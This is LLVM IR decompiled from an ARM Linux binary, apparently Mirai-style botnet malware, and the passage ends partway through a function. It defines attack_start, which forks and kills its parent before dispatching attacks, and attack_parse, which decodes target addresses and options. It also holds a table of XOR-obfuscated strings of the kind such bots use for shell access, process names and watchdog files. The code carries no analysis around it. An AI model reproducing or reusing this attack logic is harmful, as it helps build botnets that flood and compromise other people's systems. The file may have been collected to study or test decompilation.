source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%anon_struct_4 = type { i32, i32*, i8, i8 }
%anon_struct_13 = type { i32, i32*, i8, i8 }
%anon_struct_13.3 = type { i32, i32*, i8, i8 }
%vfp_regs = type { [16 x i64], i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_22240.22 = global i32 0
@global_var_db58.26 = constant i32 -382906384
@global_var_22464.31 = global i32 0
@global_var_831c.32 = constant i32 -352321547
@global_var_135cc.33 = constant i32 -382909968
@global_var_bd94.39 = constant i32 -382906384
@global_var_c1cc.41 = constant i32 -382906384
@global_var_b608.43 = constant i32 -382906384
@global_var_af5c.45 = constant i32 -382906384
@global_var_a864.47 = constant i32 -382906384
@global_var_a0b0.49 = constant i32 -382906384
@global_var_9040.52 = constant i32 -382906384
@global_var_89ac.54 = constant i32 -382906384
@global_var_965c.56 = constant i32 -382906384
@global_var_10000.57 = constant i32 167772247
@global_var_24f80.59 = global i32 0
@global_var_24f88.71 = global i32 0
@global_var_19ab8.73 = constant i32 47
@global_var_c707.75 = constant [3 x i8] c"\0AH\00"
@global_var_22468.77 = global i32 0
@global_var_24f84.79 = global i32 0
@global_var_114ac.81 = constant i32 -382910336
@global_var_d4e4.82 = constant i32 -509607932
@global_var_d9e4.84 = constant i32 -382910352
@global_var_222f4.86 = global i32 69220
@global_var_222ec.88 = global i32 -1
@global_var_24f90.94 = local_unnamed_addr global i32 0
@global_var_24f8e.95 = local_unnamed_addr global i32 0
@global_var_2246c.97 = global i32 0
@global_var_19abc.105 = constant i32 10
@global_var_222f0.107 = global i32 -1
@global_var_14aa0.112 = constant i32 -450904024
@global_var_10e64.113 = constant i32 -382910352
@global_var_19ac0.117 = constant i32 16777216
@global_var_22474.119 = global i32 0
@global_var_22480.121 = global i32 0
@global_var_22478.123 = global i32 0
@global_var_2247c.125 = global i32 0
@global_var_e9dc.138 = constant i32 -509607925
@global_var_24fa4.140 = global i32 0
@global_var_224b8.142 = global i32 0
@global_var_22484.144 = global i32 0
@global_var_224b0.146 = global i32 0
@global_var_24f9c.153 = global i32 0
@global_var_24fa0.155 = global i32 0
@global_var_2248a.158 = local_unnamed_addr global i32 0
@global_var_2249c.160 = global i32 0
@global_var_2248c.162 = local_unnamed_addr global i32 0
@global_var_22490.163 = local_unnamed_addr global i32 0
@global_var_22491.164 = local_unnamed_addr global i32 0
@global_var_224aa.167 = local_unnamed_addr global i32 0
@global_var_19ac8.169 = constant [5 x i8] c"&;; \00"
@global_var_19acc.171 = constant i32 0
@global_var_19ad0.173 = constant [5 x i8] c"5:?;\00"
@global_var_19ad8.175 = constant [9 x i8] c"<!: acam\00"
@global_var_19ae4.177 = constant [8 x i8] c"0125!8 \00"
@global_var_19aec.179 = constant [9 x i8] c"$5''#;&0\00"
@global_var_19af8.181 = constant [6 x i8] c"509=:\00"
@global_var_19b00.183 = constant [6 x i8] c"\22=.,\22\00"
@global_var_19b08.185 = constant [8 x i8] c"'!$$;& \00"
@global_var_19b10.187 = constant i32 423502179
@global_var_19b20.189 = constant [6 x i8] c"efg`a\00"
@global_var_19b28.191 = constant [5 x i8] c"!'1&\00"
@global_var_19b30.193 = constant i32 943467547
@global_var_19b3c.195 = constant i32 322070023
@global_var_19b48.197 = constant [5 x i8] c"efg`\00"
@global_var_22494.198 = local_unnamed_addr global i32 0
@global_var_22492.199 = local_unnamed_addr global i32 0
@global_var_22498.200 = local_unnamed_addr global i32 0
@global_var_224a0.202 = local_unnamed_addr global i32 0
@global_var_224ac.203 = local_unnamed_addr global i32 0
@global_var_eaec.205 = constant i32 -382910352
@global_var_19b50.207 = constant [3 x i8] c"\0D\0A\00"
@global_var_19b5c.209 = constant i32 2096127
@global_var_19b53.211 = constant i32 2095871
@global_var_24fac.216 = global i32 0
@global_var_222fc.219 = global i32 -555811921
@global_var_19b60.224 = constant i32 48212
@global_var_24fb4.225 = local_unnamed_addr global i32 0
@global_var_24fb8.226 = local_unnamed_addr global i32 0
@global_var_19b64.228 = constant [14 x i8] c"0;'9-=$z78!6T\00"
@global_var_24fbc.229 = local_unnamed_addr global i32 0
@global_var_24fc0.230 = local_unnamed_addr global i32 0
@global_var_19b74.232 = constant [13 x i8] c"'1:$5=z'= 1T\00"
@global_var_24fc8.233 = local_unnamed_addr global i32 0
@global_var_24fc4.234 = local_unnamed_addr global i32 0
@global_var_19b84.236 = constant i32 28654
@global_var_24fcc.237 = local_unnamed_addr global i32 0
@global_var_24fd0.238 = local_unnamed_addr global i32 0
@global_var_19b88.240 = constant [37 x i8] c"&;; t'1:$5=t>!' t=:217 10t-;!&t'<= T\00"
@global_var_24fd4.241 = local_unnamed_addr global i32 0
@global_var_24fd8.242 = local_unnamed_addr global i32 0
@global_var_19bb0.244 = constant [7 x i8] c"'<188T\00"
@global_var_24fdc.245 = local_unnamed_addr global i32 0
@global_var_24fe0.246 = local_unnamed_addr global i32 0
@global_var_19bb8.248 = constant [8 x i8] c"1:5681T\00"
@global_var_24fe4.249 = local_unnamed_addr global i32 0
@global_var_24fe8.250 = local_unnamed_addr global i32 0
@global_var_19bc0.252 = constant [8 x i8] c"'-' 19T\00"
@global_var_24fec.253 = local_unnamed_addr global i32 0
@global_var_24ff0.254 = local_unnamed_addr global i32 0
@global_var_19bc8.256 = constant [4 x i8] c"'<T\00"
@global_var_24ff8.257 = local_unnamed_addr global i32 0
@global_var_24ff4.258 = local_unnamed_addr global i32 0
@global_var_10b44.259 = constant i32 105420
@global_var_19bcc.260 = constant i32 977090171
@global_var_24ffc.261 = local_unnamed_addr global i32 0
@global_var_25000.262 = local_unnamed_addr global i32 0
@global_var_19be0.264 = constant i32 102440217
@global_var_25004.265 = local_unnamed_addr global i32 0
@global_var_25008.266 = local_unnamed_addr global i32 0
@global_var_19bfc.268 = constant [10 x i8] c":7;&&17 T\00"
@global_var_25010.269 = local_unnamed_addr global i32 0
@global_var_2500c.270 = local_unnamed_addr global i32 0
@global_var_19c08.272 = constant [17 x i8] c"{6=:{6!'-6;,t$'T\00"
@global_var_25014.273 = local_unnamed_addr global i32 0
@global_var_25018.274 = local_unnamed_addr global i32 0
@global_var_19c1c.276 = constant [23 x i8] c"{6=:{6!'-6;,t?=88tymtT\00"
@global_var_2501c.277 = local_unnamed_addr global i32 0
@global_var_25020.278 = local_unnamed_addr global i32 0
@global_var_19c34.280 = constant [8 x i8] c"{$&;7{T\00"
@global_var_25024.281 = local_unnamed_addr global i32 0
@global_var_25028.282 = local_unnamed_addr global i32 0
@global_var_19c3c.284 = constant [6 x i8] c"{1,1T\00"
@global_var_25030.285 = local_unnamed_addr global i32 0
@global_var_2502c.286 = local_unnamed_addr global i32 0
@global_var_19c44.288 = constant [5 x i8] c"{20T\00"
@global_var_25034.289 = local_unnamed_addr global i32 0
@global_var_25038.290 = local_unnamed_addr global i32 0
@global_var_19c4c.292 = constant [7 x i8] c"{95$'T\00"
@global_var_2503c.293 = local_unnamed_addr global i32 0
@global_var_25040.294 = local_unnamed_addr global i32 0
@global_var_19c54.296 = constant [15 x i8] c"{$&;7{:1 { 7$T\00"
@global_var_25044.297 = local_unnamed_addr global i32 0
@global_var_25048.298 = local_unnamed_addr global i32 0
@global_var_19c64.300 = constant [9 x i8] c"{' 5 !'T\00"
@global_var_250bc.301 = local_unnamed_addr global i32 0
@global_var_19c70.303 = constant [8 x i8] c"z5:=91T\00"
@global_var_250c4.304 = local_unnamed_addr global i32 0
@global_var_19c78.306 = constant [17 x i8] c"{$&;7{:1 {&;! 1T\00"
@global_var_2504c.307 = local_unnamed_addr global i32 0
@global_var_25050.308 = local_unnamed_addr global i32 0
@global_var_19c8c.310 = constant [24 x i8] c"3e567`09;ga<:$f8=1d?>2T\00"
@global_var_25054.311 = local_unnamed_addr global i32 0
@global_var_25058.312 = local_unnamed_addr global i32 0
@global_var_19ca4.314 = constant [9 x i8] c"5''#;&0T\00"
@global_var_2505c.315 = local_unnamed_addr global i32 0
@global_var_25060.316 = local_unnamed_addr global i32 0
@global_var_19cb0.318 = constant [15 x i8] c"{01\22{#5 7<0;3T\00"
@global_var_25064.319 = local_unnamed_addr global i32 0
@global_var_25068.320 = local_unnamed_addr global i32 0
@global_var_19cc0.322 = constant [20 x i8] c"{01\22{9='7{#5 7<0;3T\00"
@global_var_2506c.323 = local_unnamed_addr global i32 0
@global_var_25070.324 = local_unnamed_addr global i32 0
@global_var_19cd4.326 = constant [11 x i8] c"0\22&<18$1&T\00"
@global_var_250cc.327 = local_unnamed_addr global i32 0
@global_var_19d38.329 = constant i32 557516544
@global_var_25078.330 = local_unnamed_addr global i32 0
@global_var_25074.331 = local_unnamed_addr global i32 0
@global_var_19ce0.333 = constant [18 x i8] c"{1 7{&1';8\22z7;:2T\00"
@global_var_2507c.334 = local_unnamed_addr global i32 0
@global_var_25080.335 = local_unnamed_addr global i32 0
@global_var_19cf4.337 = constant [13 x i8] c":591'1&\221&tT\00"
@global_var_25088.338 = local_unnamed_addr global i32 0
@global_var_25084.339 = local_unnamed_addr global i32 0
@global_var_2508c.340 = local_unnamed_addr global i32 0
@global_var_25090.341 = local_unnamed_addr global i32 0
@global_var_25094.342 = local_unnamed_addr global i32 0
@global_var_25098.343 = local_unnamed_addr global i32 0
@global_var_19d04.345 = constant [9 x i8] c"$662*7!E\00"
@global_var_2509c.346 = local_unnamed_addr global i32 0
@global_var_250a0.347 = local_unnamed_addr global i32 0
@global_var_19d10.349 = constant [6 x i8] c";3=:T\00"
@global_var_250a4.350 = local_unnamed_addr global i32 0
@global_var_250a8.351 = local_unnamed_addr global i32 0
@global_var_19d18.353 = constant [7 x i8] c"1: 1&T\00"
@global_var_250ac.354 = local_unnamed_addr global i32 0
@global_var_19d20.356 = constant [24 x i8] c"e365`70;9ag:<$ef1=d?2>T\00"
@global_var_250b4.357 = local_unnamed_addr global i32 0
@global_var_22244.363 = global i32 0
@global_var_10b00.382 = constant i32 -352321468
@global_var_11804.387 = constant i32 -443088884
@global_var_10a58.389 = constant i32 -352321426
@global_var_11c9c.404 = constant i32 -456978431
@global_var_10368.420 = constant i32 -352321456
@global_var_ff50.444 = constant i32 167772168
@global_var_1258c.453 = constant i32 -478871519
@global_var_fcf8.455 = constant i32 167772206
@global_var_13030.471 = constant i32 -478805983
@global_var_13418.481 = constant i32 -382906384
@global_var_15520.490 = constant i32 -442544040
@global_var_13db0.513 = constant i32 -369098502
@global_var_14784.527 = constant i32 -382910288
@global_var_14934.539 = constant i32 -2020859901
@global_var_14a20.542 = constant i32 -494075872
@global_var_11670.543 = constant i32 -382910336
@global_var_2545c.546 = local_unnamed_addr global i32 0
@global_var_13848.559 = constant i32 -442543860
@global_var_11c00.567 = constant i32 -369093146
@global_var_cef8.584 = constant [3 x i8] c"u\0D\00"
@global_var_cce0.594 = constant i32 -528220150
@global_var_15a18.595 = constant i32 -382910352
@global_var_ca84.603 = constant [3 x i8] c") \00"
@global_var_ca44.605 = constant i32 -509607927
@global_var_16e28.618 = constant i32 -382906384
@global_var_bb84.636 = constant i32 -494075848
@global_var_168e8.647 = constant i32 -382910448
@global_var_182d8.648 = constant i32 -382909968
@global_var_18a14.709 = constant i32 -481296376
@global_var_18b0c.710 = constant i32 -481296376
@global_var_18b90.711 = constant i32 -369098732
@global_var_22444.12 = external global i8*
@global_var_22460.29 = external global i8*
@global_var_22461.37 = global i8 0
@1 = internal constant [2 x i8] c"\01\00"
@global_var_222f8.90 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_24f8c.93 = global i16* null
@global_var_22470.110 = external global i8*
@global_var_224b4.148 = global i16* null
@global_var_22488.157 = external global i8*
@global_var_224a8.161 = local_unnamed_addr global i8 0
@global_var_2249e.165 = local_unnamed_addr global i16 0
@global_var_224a9.166 = local_unnamed_addr global i8 0
@global_var_2229c.359 = local_unnamed_addr global i16 8

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80f0 = load i32, i32* @r4, align 4
  store i32 %v3_80f0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_22444.12 to i32), i32* %r4.global-to-local, align 4
  %v2_80f8 = load i8, i8* bitcast (i8** @global_var_22444.12 to i8*), align 4
  %v2_80fc = icmp eq i8 %v2_80f8, 0
  br i1 %v2_80fc, label %dec_label_pc_8104, label %dec_label_pc_8120

dec_label_pc_8104:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_811c = load i32, i32* %r4.global-to-local, align 4
  %v3_811c = inttoptr i32 %v2_811c to i8*
  store i8 1, i8* %v3_811c, align 1
  %v2_8120.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8120

dec_label_pc_8120:                                ; preds = %entry, %dec_label_pc_8104
  %v2_8120 = phi i32 [ %v3_80f0, %entry ], [ %v2_8120.pre, %dec_label_pc_8104 ]
  store i32 %v2_8120, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_22444.12, { 1, 0 }
  uselistorder label %dec_label_pc_8120, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* @global_var_22240.22, align 4
  %v2_815c = icmp eq i32 %v2_8158, 0
  br i1 %v2_815c, label %dec_label_pc_8174, label %dec_label_pc_8164

dec_label_pc_8164:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8174

dec_label_pc_8174:                                ; preds = %bb, %dec_label_pc_8164
  ret i32 ptrtoint (i32* @global_var_22240.22 to i32)

; uselistorder directives
  uselistorder i32* @global_var_22240.22, { 1, 0 }
  uselistorder label %dec_label_pc_8174, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_819c = ptrtoint i32* %stack_var_4 to i32
  %v8_81bc = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_db58.26 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32980, i32 105128, i32 %arg1, i32 %v4_819c)
  %v0_81c0 = call i32 @abort()
  ret i32 %v0_81c0
}

define i32 @attack_get_opt_str(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_81d0 = icmp eq i32 %arg1, 0
  br i1 %v2_81d0, label %dec_label_pc_8218, label %dec_label_pc_81e0

dec_label_pc_81e0:                                ; preds = %entry
  %v0_81e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_81e0 = add i32 %v0_81e0, 4
  %v2_81e0 = inttoptr i32 %v1_81e0 to i8*
  %v3_81e0 = load i8, i8* %v2_81e0, align 1
  %v4_81e0 = zext i8 %v3_81e0 to i32
  %v9_81e4 = icmp eq i32 %v4_81e0, %arg3
  br i1 %v9_81e4, label %dec_label_pc_8224, label %dec_label_pc_8208.preheader

dec_label_pc_8208.preheader:                      ; preds = %dec_label_pc_81e0
  br label %dec_label_pc_8208

dec_label_pc_81f8:                                ; preds = %dec_label_pc_8208
  %v1_81f8 = add i32 %v0_8200.in, 12
  %v2_81f8 = inttoptr i32 %v1_81f8 to i8*
  %v3_81f8 = load i8, i8* %v2_81f8, align 1
  %v4_81f8 = zext i8 %v3_81f8 to i32
  %v9_81fc = icmp eq i32 %v4_81f8, %arg3
  br i1 %v9_81fc, label %dec_label_pc_8224, label %dec_label_pc_8208

dec_label_pc_8208:                                ; preds = %dec_label_pc_8208.preheader, %dec_label_pc_81f8
  %v0_8200.in = phi i32 [ %v0_81e0, %dec_label_pc_8208.preheader ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v0_8208 = phi i32 [ 0, %dec_label_pc_8208.preheader ], [ %v1_8208, %dec_label_pc_81f8 ]
  %v0_8200 = add i32 %v0_8200.in, 8
  %v1_8208 = add i32 %v0_8208, 1
  %v9_820c = icmp eq i32 %v1_8208, %arg1
  store i32 %v0_8200, i32* %r1.global-to-local, align 4
  br i1 %v9_820c, label %dec_label_pc_8218, label %dec_label_pc_81f8

dec_label_pc_8218:                                ; preds = %dec_label_pc_8208, %entry, %dec_label_pc_8224
  %v0_8218 = phi i32 [ %arg4, %entry ], [ %v2_8224, %dec_label_pc_8224 ], [ %arg4, %dec_label_pc_8208 ]
  ret i32 %v0_8218

dec_label_pc_8224:                                ; preds = %dec_label_pc_81f8, %dec_label_pc_81e0
  %v0_8224 = phi i32 [ %v0_81e0, %dec_label_pc_81e0 ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v1_8224 = inttoptr i32 %v0_8224 to i32*
  %v2_8224 = load i32, i32* %v1_8224, align 4
  br label %dec_label_pc_8218

; uselistorder directives
  uselistorder i32 %v1_8208, { 1, 0 }
  uselistorder i32 %v0_8200, { 1, 0, 2 }
  uselistorder i32 %v0_8200.in, { 1, 0 }
  uselistorder i32 %v0_81e0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8218, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8208, { 1, 0 }
}

define i32 @attack_start(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_822c = load i32, i32* @r4, align 4
  store i32 %v3_822c, i32* %stack_var_-32, align 4
  %v6_822c = load i32, i32* @r5, align 4
  %v9_822c = load i32, i32* @r6, align 4
  %v12_822c = load i32, i32* @r7, align 4
  %v0_8230 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_8230, i32* @sb, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @sl, align 4
  %v4_8240 = sext i8 %arg5 to i32
  store i32 %v4_8240, i32* @r8, align 4
  %v0_8244 = call i32 @__libc_fork()
  %v7_8248 = icmp eq i32 %v0_8244, -1
  %. = zext i1 %v7_8248 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %tmp23 = icmp slt i32 %v0_8244, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %entry
  br label %dec_label_pc_8268

bb24:                                             ; preds = %entry
  store i32 %., i32* @r5, align 4
  %v2_8260 = icmp eq i1 %v7_8248, false
  br i1 %v2_8260, label %dec_label_pc_8270, label %dec_label_pc_8268

dec_label_pc_8268:                                ; preds = %.thread2, %bb24
  %v2_8268 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_8268, i32* @r4, align 4
  store i32 %v6_822c, i32* @r5, align 4
  store i32 %v9_822c, i32* @r6, align 4
  store i32 %v12_822c, i32* @r7, align 4
  ret i32 %v0_8244

dec_label_pc_8270:                                ; preds = %bb24
  %v0_8270 = call i32 @__libc_fork()
  %v7_8274 = icmp eq i32 %v0_8270, -1
  store i32 %v0_8270, i32* @r4, align 4
  br i1 %v7_8274, label %dec_label_pc_82a4, label %dec_label_pc_8280

dec_label_pc_8280:                                ; preds = %dec_label_pc_8270
  %v2_8280 = icmp eq i32 %v0_8270, 0
  br i1 %v2_8280, label %dec_label_pc_8288, label %dec_label_pc_82ac

dec_label_pc_8288:                                ; preds = %dec_label_pc_8280
  %v0_8288 = load i32, i32* @r6, align 4
  %v1_828c = call i32 @sleep(i32 %v0_8288)
  store i32 %v1_828c, i32* @r0, align 4
  %v0_8290 = call i32 @getppid()
  %v2_8298 = call i32 @kill(i32 %v0_8290, i32 9)
  %v0_829c = load i32, i32* @r4, align 4
  %v1_82a0 = call i32 @__GI_exit(i32 %v0_829c)
  br label %dec_label_pc_82a4

dec_label_pc_82a4:                                ; preds = %dec_label_pc_8270, %dec_label_pc_8288
  %v0_82a4 = load i32, i32* @r5, align 4
  %v1_82a8 = call i32 @__GI_exit(i32 %v0_82a4)
  br label %dec_label_pc_82ac

dec_label_pc_82ac:                                ; preds = %dec_label_pc_8280, %dec_label_pc_82a4
  store i32 ptrtoint (i8** @global_var_22460.29 to i32), i32* %r3.global-to-local, align 4
  %v2_82b0 = load i8, i8* bitcast (i8** @global_var_22460.29 to i8*), align 4
  %v3_82b0 = zext i8 %v2_82b0 to i32
  %v2_82b4 = icmp eq i8 %v2_82b0, 0
  br i1 %v2_82b4, label %dec_label_pc_82f8, label %dec_label_pc_82bc

dec_label_pc_82bc:                                ; preds = %dec_label_pc_82ac
  store i32 ptrtoint (i32* @global_var_22464.31 to i32), i32* %r3.global-to-local, align 4
  %v2_82c0 = load i32, i32* @global_var_22464.31, align 4
  %v1_82c4 = inttoptr i32 %v2_82c0 to i32*
  %v2_82c4 = load i32, i32* %v1_82c4, align 4
  %v1_82c8 = add i32 %v2_82c4, 4
  %v2_82c8 = inttoptr i32 %v1_82c8 to i8*
  %v3_82c8 = load i8, i8* %v2_82c8, align 1
  %v4_82c8 = zext i8 %v3_82c8 to i32
  store i32 %v4_82c8, i32* %r3.global-to-local, align 4
  %v1_82cc = load i32, i32* @r7, align 4
  %v9_82cc = icmp eq i32 %v4_82c8, %v1_82cc
  br i1 %v9_82cc, label %dec_label_pc_8300, label %dec_label_pc_82ec.preheader

dec_label_pc_82ec.preheader:                      ; preds = %dec_label_pc_82bc
  %v1_82d0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_82ec

dec_label_pc_82dc:                                ; preds = %dec_label_pc_82ec
  %v4_82dc = mul i32 %v1_82ec, 4
  %v5_82dc = add i32 %v4_82dc, %v2_82c0
  %v6_82dc = inttoptr i32 %v5_82dc to i32*
  %v7_82dc = load i32, i32* %v6_82dc, align 4
  %v1_82e0 = add i32 %v7_82dc, 4
  %v2_82e0 = inttoptr i32 %v1_82e0 to i8*
  %v3_82e0 = load i8, i8* %v2_82e0, align 1
  %v4_82e0 = zext i8 %v3_82e0 to i32
  store i32 %v4_82e0, i32* %r3.global-to-local, align 4
  %v9_82e4 = icmp eq i32 %v4_82e0, %v1_82cc
  br i1 %v9_82e4, label %dec_label_pc_8300, label %dec_label_pc_82ec

dec_label_pc_82ec:                                ; preds = %dec_label_pc_82ec.preheader, %dec_label_pc_82dc
  %v0_82ec = phi i32 [ %v1_82d0, %dec_label_pc_82ec.preheader ], [ %v1_82ec, %dec_label_pc_82dc ]
  %v1_82ec = add i32 %v0_82ec, 1
  %v9_82f0 = icmp eq i32 %v1_82ec, %v3_82b0
  br i1 %v9_82f0, label %dec_label_pc_82f8, label %dec_label_pc_82dc

dec_label_pc_82f8:                                ; preds = %dec_label_pc_82ec, %dec_label_pc_82ac, %dec_label_pc_8300
  %v1_82fc = call i32 @__GI_exit(i32 0)
  %v0_8310.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_8300

dec_label_pc_8300:                                ; preds = %dec_label_pc_82dc, %dec_label_pc_82bc, %dec_label_pc_82f8
  %v0_8310 = phi i32 [ %v2_82c4, %dec_label_pc_82bc ], [ %v0_8310.pre, %dec_label_pc_82f8 ], [ %v7_82dc, %dec_label_pc_82dc ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v1_8310 = inttoptr i32 %v0_8310 to i32*
  %v2_8310 = load i32, i32* %v1_8310, align 4
  call void @__pseudo_branch(i32 %v2_8310)
  br label %dec_label_pc_82f8

; uselistorder directives
  uselistorder i32 %v1_82ec, { 2, 0, 1 }
  uselistorder i32 %v0_8270, { 1, 2, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_8248, { 1, 0 }
  uselistorder i32 %v0_8244, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 2, 0, 1 }
  uselistorder label %dec_label_pc_8300, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82ec, { 1, 0 }
  uselistorder label %dec_label_pc_82ac, { 1, 0 }
  uselistorder label %dec_label_pc_82a4, { 1, 0 }
  uselistorder label %dec_label_pc_8268, { 1, 0 }
}

define i32 @attack_parse(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_8328 = load i32, i32* @r5, align 4
  %v9_8328 = load i32, i32* @r6, align 4
  %v12_8328 = load i32, i32* @r7, align 4
  %v18_8328 = load i32, i32* @sb, align 4
  %v21_8328 = load i32, i32* @sl, align 4
  %v24_8328 = load i32, i32* @fp, align 4
  %v2_832c = icmp ugt i32 %arg2, 2
  %v7_832c = icmp eq i32 %arg2, 3
  store i1 %v7_832c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_8338 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_8338, i32* @r5, align 4
  %v2_833c = xor i1 %v7_832c, true
  %v3_833c = and i1 %v2_832c, %v2_833c
  br i1 %v3_833c, label %dec_label_pc_834c, label %dec_label_pc_8340

dec_label_pc_8340:                                ; preds = %dec_label_pc_838c, %.dec_label_pc_8340_crit_edge, %dec_label_pc_8380, %dec_label_pc_8370, %dec_label_pc_834c, %entry, %dec_label_pc_8538
  %v1_8348 = phi i32 [ %v1_8348.pre, %.dec_label_pc_8340_crit_edge ], [ %v1_8350, %dec_label_pc_838c ], [ %v1_8350, %dec_label_pc_8380 ], [ %v1_8350, %dec_label_pc_8370 ], [ %v1_8350, %dec_label_pc_834c ], [ %v0_8338, %entry ], [ %v0_853c, %dec_label_pc_8538 ]
  store i32 %v6_8328, i32* @r5, align 4
  store i32 %v9_8328, i32* @r6, align 4
  store i32 %v12_8328, i32* @r7, align 4
  store i32 %v18_8328, i32* @sb, align 4
  store i32 %v21_8328, i32* @sl, align 4
  store i32 %v24_8328, i32* @fp, align 4
  ret i32 %v1_8348

dec_label_pc_834c:                                ; preds = %entry
  %v1_834c = inttoptr i32 %v0_8338 to i32*
  %v2_834c = load i32, i32* %v1_834c, align 4
  store i32 %v2_834c, i32* %r1.global-to-local, align 4
  %v1_8350 = and i32 %v2_834c, 16711680
  store i32 %v1_8350, i32* %r0.global-to-local, align 4
  %v3_8354 = udiv i32 %v2_834c, 16777216
  %v4_8358 = udiv i32 %v1_8350, 256
  %v5_8358 = or i32 %v4_8358, %v3_8354
  %v1_835c = and i32 %v2_834c, 65280
  store i32 %v1_835c, i32* %r2.global-to-local, align 4
  %v4_8360 = mul nuw nsw i32 %v1_835c, 256
  %v5_8360 = or i32 %v5_8358, %v4_8360
  store i32 %v5_8360, i32* %r3.global-to-local, align 4
  %v7_8364 = icmp eq i32 %arg2, 4
  store i1 %v7_8364, i1* %cpsr_z.global-to-local, align 1
  %v5_8368 = call i32 @llvm.bswap.i32(i32 %v2_834c)
  store i32 %v5_8368, i32* @fp, align 4
  br i1 %v7_8364, label %dec_label_pc_8340, label %dec_label_pc_8370

dec_label_pc_8370:                                ; preds = %dec_label_pc_834c
  %v1_8370 = add i32 %v0_8338, 4
  %v2_8370 = inttoptr i32 %v1_8370 to i8*
  %v3_8370 = load i8, i8* %v2_8370, align 1
  %v4_8370 = zext i8 %v3_8370 to i32
  store i32 %v4_8370, i32* %r2.global-to-local, align 4
  %v7_8374 = icmp eq i32 %arg2, 5
  store i1 %v7_8374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8374, label %dec_label_pc_8340, label %dec_label_pc_8380

dec_label_pc_8380:                                ; preds = %dec_label_pc_8370
  %v1_8380 = add i32 %v0_8338, 5
  %v2_8380 = inttoptr i32 %v1_8380 to i8*
  %v3_8380 = load i8, i8* %v2_8380, align 1
  %v4_8380 = zext i8 %v3_8380 to i32
  store i32 %v4_8380, i32* @sb, align 4
  %v2_8384 = icmp eq i8 %v3_8380, 0
  store i1 %v2_8384, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8384, label %dec_label_pc_8340, label %dec_label_pc_838c

dec_label_pc_838c:                                ; preds = %dec_label_pc_8380
  %v2_8390 = mul nuw nsw i32 %v4_8380, 5
  store i32 %v2_8390, i32* @r7, align 4
  %v1_8394 = add i32 %arg2, -6
